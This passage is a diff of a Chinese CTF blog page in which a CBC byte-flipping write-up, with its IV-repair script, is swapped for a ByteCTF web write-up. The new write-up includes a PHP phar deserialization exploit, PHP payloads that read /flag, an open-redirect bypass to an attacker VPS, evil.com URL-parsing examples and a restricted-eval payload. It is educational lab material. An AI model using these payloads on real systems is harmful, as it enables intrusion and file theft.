class="line">cipher=TGeyDeiboBvS11EpL/PAmab0WF81avB95n2qIBqqyw6YtTF9dHc+LhrzywO4xBrFO8QiGFuzCvVVmYiDLCFPvg==</span><br></pre></td></tr></table></figure>
+<p>exp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	class File&#123;</span><br><span class="line">		public $filename;</span><br><span class="line">		public $filepath;</span><br><span class="line">		public $checker;</span><br><span class="line">		function __construct() &#123;</span><br><span class="line">			$this-&gt;checker = new Profile();	</span><br><span class="line">		&#125;</span><br><span class="line">		function __destruct() &#123;</span><br><span class="line">			if (isset($this-&gt;checker)) &#123;</span><br><span class="line">				$this-&gt;checker-&gt;upload_file();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	class Profile&#123;</span><br><span class="line">		public $username;</span><br><span class="line">		public $password;</span><br><span class="line">		public $admin;</span><br><span class="line">		function __construct() &#123;</span><br><span class="line">			$this-&gt;admin = new ZipArchive;</span><br><span class="line">			$this-&gt;username = &apos;/var/www/html/sandbox/848516b9a263eb46fd487ce1cd295f06/.htaccess&apos;;</span><br><span class="line">			$this-&gt;password = ZIPARCHIVE::OVERWRITE;</span><br><span class="line">		&#125;</span><br><span class="line">		function __call($name, $arguments) &#123;</span><br><span class="line">			$this-&gt;admin-&gt;open($this-&gt;username, $this-&gt;password);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	@unlink(&quot;phar.phar&quot;);</span><br><span class="line">	$phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar</span><br><span class="line">	$phar-&gt;startBuffering();</span><br><span class="line">	$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;); //设置stub</span><br><span class="line">	$o = new File();</span><br><span class="line">	$phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest</span><br><span class="line">	$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件</span><br><span class="line">	//签名自动计算</span><br><span class="line">	$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
 
-<p>想办法把admim的m变成n，已知cbc加密之前的数据是</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;s:8:&quot;userna</span><br><span class="line">me&quot;;s:5:&quot;admim&quot;;</span><br><span class="line">s:8:&quot;password&quot;;s</span><br><span class="line">:7:&quot;glotozz&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<p>上传</p>
+<p>phar.phar</p>
+<p>view.php中访问，利用php:filter绕过正则表达式对phar的过滤</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">view.php?filename=&amp;filepath=php://filter/convert.base64-</span><br><span class="line">encode/resource=phar://sandbox/848516b9a263eb46fd487ce1cd295f06/3a9958c0490c6d5f6ca6d3fa1d23ed04.phar</span><br></pre></td></tr></table></figure>
 
-<p>因为cipher进行了base64编码，先解码，找到m对应的第一组那一位对应的ascii^ord(‘m’)^ord(‘n’)</p>
-<p>，再整体base64编码补充回去</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cipher_raw=&apos;%2FOvsLy1Ut%2FzVtd35B0OYLE0RVMHS8OwEZCdAE1cNmibXU8t345Ma6E2Btu0aqYMIlNem4t0BEJz6ho6lxsQZlQ%3D%3D&apos;</span><br><span class="line">cipher = base64.b64decode(urllib.unquote(cipher_raw))</span><br><span class="line">xor_cipher = cipher[0:13] +chr(ord(cipher[13]) ^ ord(&apos;m&apos;) ^ ord(&apos;n&apos;)) + cipher[14:]</span><br><span class="line">xor_cipher=urllib.quote(base64.b64encode(xor_cipher))</span><br><span class="line">print &quot;反转后的cipher：&quot; + xor_cipher</span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line"></span><br><span class="line">反转后的cipher：/OvsLy1Ut/zVtd35B0CYLE0RVMHS8OwEZCdAE1cNmibXU8t345Ma6E2Btu0aqYMIlNem4t0BEJz6ho6lxsQZlQ%3D%3D</span><br></pre></td></tr></table></figure>
+<p>再传个，这里eval等黑名单=。=，我们没别的想法，只想读个flag用下面的就行😄</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	var_dump(file_get_contents(&quot;/flag&quot;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
-<p>删去post的数据，提交，应该是不行的，因为iv还没修改，得到</p>
-<p><img src="https://i.loli.net/2019/09/08/e6EsG8my1nV3Rbo.png" alt="Snipaste_2019-09-08_16-11-43.png"></p>
-<p>也就是说，在解密的时候从后往前，到第一块时即和初始化向量那啥的时候出了问题，修复初始化向量</p>
-<p>已知</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#被损坏前正确的明文</span><br><span class="line">a:2:&#123;s:8:&quot;userna</span><br><span class="line">#错误的初始化向量</span><br><span class="line">L6hViVGf%2Fy5GzIkvpux0ZQ%3D%3D</span><br><span class="line">#密文</span><br><span class="line">pqtG71a3RuM75zmMZgoC2m1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjc6Imdsb3RvenoiO30=</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	include(&apos;/flag&apos;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
-<p>还原脚本</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cipher = &apos;pqtG71a3RuM75zmMZgoC2m1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjc6Imdsb3RvenoiO30=&apos;#填写提交后所得的错误的plaintext</span><br><span class="line">iv = &apos;L6hViVGf%2Fy5GzIkvpux0ZQ%3D%3D&apos;#一开始提交的iv</span><br><span class="line">cipher = urllib.unquote(cipher)</span><br><span class="line">cipher = base64.b64decode(cipher)</span><br><span class="line">iv = base64.b64decode(urllib.unquote(iv))</span><br><span class="line">newIv = &apos;&apos;</span><br><span class="line">right = &apos;a:2:&#123;s:8:&quot;userna&apos;#被损坏前正确的明文</span><br><span class="line">for i in range(16):</span><br><span class="line">    newIv += chr(ord(right[i])^ord(iv[i])^ord(cipher[i])) #这一步相当于把原来iv中不匹配的部分修改过来</span><br><span class="line">print urllib.quote(base64.b64encode(newIv))</span><br></pre></td></tr></table></figure>
+<p>访问即可</p>
+<p><img src="https://i.loli.net/2019/09/09/ZMSdN5IxfhBatHG.png" alt="Snipaste_2019-09-09_13-01-40.png"></p>
+<h3 id="Boring-code"><a href="#Boring-code" class="headerlink" title="Boring_code"></a>Boring_code</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function is_valid_url($url) &#123;</span><br><span class="line">    if (filter_var($url, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">        if (preg_match(&apos;/data:\/\//i&apos;, $url)) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&apos;url&apos;]))&#123;</span><br><span class="line">    $url = $_POST[&apos;url&apos;];</span><br><span class="line">    if (is_valid_url($url)) &#123;</span><br><span class="line">        $r = parse_url($url);</span><br><span class="line">        if (preg_match(&apos;/baidu\.com$/&apos;, $r[&apos;host&apos;])) &#123;</span><br><span class="line">            $code = file_get_contents($url);</span><br><span class="line">            if (&apos;;&apos; === preg_replace(&apos;/[a-z]+\((?R)?\)/&apos;, NULL, $code)) &#123;</span><br><span class="line">                if (preg_match(&apos;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&apos;, $code)) &#123;</span><br><span class="line">                    echo &apos;bye~&apos;;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    eval($code);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &quot;error: host not allowed&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;error: invalid url&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>把iv修改提交即可</p>
-<p><img src="https://i.loli.net/2019/09/08/vw5iDlJGNdMjVZW.png" alt="Snipaste_2019-09-08_16-24-07.png"></p>
-<p>成功！！👌</p>
-<h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p><a href="https://www.anquanke.com/post/id/180186#h2-3" target="_blank" rel="noopener">https://www.anquanke.com/post/id/180186#h2-3</a></p>
+<p>三层过滤。。。</p>
+<p>一、filter_var()函数检查url的合法性，不能包含data://</p>
+<p>二、parse_url()解析url的host必须以baidu.com结尾</p>
+<p>三、正则匹配字母，(?R)是引用当前表达式的意思，相当于/[a-z]+()/循环匹配，最后只剩下分号，再一次正则匹配过滤含et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log</p>
+<p>对于1、2步，filter_var()对于下面的会返回true，但是file_get_contents()是读取不到这种格式的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0://evil.com;goole.com</span><br><span class="line">0://evil.com:80;goole.com:80</span><br><span class="line">0://evil.com:80\goole.com:80</span><br></pre></td></tr></table></figure>
+
+<p>然后解决办法是利用百度的重定向到我们的vps</p>
+<p><img src="https://i.loli.net/2019/09/09/LtWnRugrVcTHjy8.png" alt="Snipaste_2019-09-09_21-22-53.png"></p>
+<p>将jump.bdimg.com替换为post.baidu.com就行（如果是tieba.baidu.com会经过一次重定向确认）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://post.baidu.com/safecheck/index?url=x+Z5mMbGPAuxvzMQ1JtsluyAASn3sWLlrv9d2NrzuKbjKs5SMwD6pElPPJrrtcEVomErKkpqfg2pp+mC+8YGv66a3rkR4NVhredtiNPp/vJz3AtxgIS8yHY9qHh6BM0y</span><br></pre></td></tr></table></figure>
+
+<p>能重定向到我们的vps啦😁</p>
+<p>第3步是简单来说就是只能执行一个函数，但不能设置参数，codebreaking中遇到过，当时paylaod是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));</span><br></pre></td></tr></table></figure>
+
+<p>所以，排除直接获取路径，我们只能够通过构造字符.来获取路径</p>
+<p>readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));<br>通过各种尝试，最后发现了一种函数time()，他能根据时间的不同来返回不同的整数,再利用chr()返回字母</p>
+<p>最后构造</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile(end(scandir(chr(time(chdir(next(scandir(chr(time())))))))));</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>其中第一个chr(time())取到    .    时，列出当前目录</p>
+<p><img src="https://i.loli.net/2019/09/09/qG7kz5ZnMjCbyPB.png" alt="Snipaste_2019-09-09_22-39-40.png"></p>
+<p>next()取到    ..</p>
+<p>chdir(‘..’)返回上一级目录，返回值如果成功就是True，失败就是False</p>
+<p>time(True)    里面的参数不影响仍返回    .        </p>
+<p><img src="https://i.loli.net/2019/09/09/V1ysnoTlDNY8SiO.png" alt="Snipaste_2019-09-09_22-45-23.png"></p>
+<p>end()取到最后一个文件</p>
+</blockquote>
+<p><img src="https://i.loli.net/2019/09/09/h3HzDpeXqvrknT6.png" alt="Snipaste_2019-09-09_21-58-31.png"></p>
+<p>最后用bp爆破下就行，题目环境关了，我裂开了。</p>
+<p>用vps搭一下，由发现一个很奇怪的问题。。。</p>
+<p>明明打印$code=”readfile(end(scandir(chr(time(chdir(next(scandir(chr(time())))))))));”</p>
+<p>打印preg_replace(‘/[a-z]+((?R)?)/‘, NULL, $code)    为    ;</p>
+<p>但是却进不了循环，裂开了😭</p>
+<h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p><a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a></p>
+<p><a href="https://paper.seebug.org/561/#parse_urllibcurlurlssrf" target="_blank" rel="noopener">https://paper.seebug.org/561/#parse_urllibcurlurlssrf</a></p>
+<p><a href="https://paper.seebug.org/561/" target="_blank" rel="noopener">https://paper.seebug.org/561/</a></p>
+<p><a href="https://www.4xseo.com/marketing/1280/#title-0" target="_blank" rel="noopener">https://www.4xseo.com/marketing/1280/#title-0</a></p>
 
       
 
@@ -293,7 +348,7 @@
           </li>
           <li class="post-copyright-link">
           <strong>文章链接:  </strong>
-          <a href="/2019/08/23/cbc字节翻转攻击/" target="_blank" title="cbc字节翻转攻击">https://glotozz.github.io/2019/08/23/cbc字节翻转攻击/</a>
+          <a href="/2019/09/09/bytectf-web/" target="_blank" title="bytectf-web">https://glotozz.github.io/2019/09/09/bytectf-web/</a>
           </li>
           <li class="post-copyright-license">
             <strong>版权声明:   </strong>
@@ -313,7 +368,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">cbc字节翻转攻击</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">wp</a>
         		</li>
       		
 		</ul>
@@ -369,7 +424,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=https://glotozz.github.io/2019/08/23/cbc字节翻转攻击/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=https://glotozz.github.io/2019/09/09/bytectf-web/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -383,18 +438,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2019/08/24/php留言板设计/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          php留言板设计
-        
-      </div>
-    </a>
   
-  
-    <a href="/2019/08/22/内网穿透工具/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">内网穿透工具</div>
+    <a href="/2019/09/08/cbc字节翻转攻击/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">cbc字节翻转攻击</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -445,7 +491,7 @@
     </div>
   </div>
 </footer>
-<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
     </div>
     <script>
 	var yiliaConfig = {
@@ -545,11 +591,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">sql注入</a>
+                <a href="javascript:void(0)" class="js-tag color1">start</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">start</a>
+                <a href="javascript:void(0)" class="js-tag color1">sql注入</a>
               </li>
              
               <li class="article-tag-list-item">
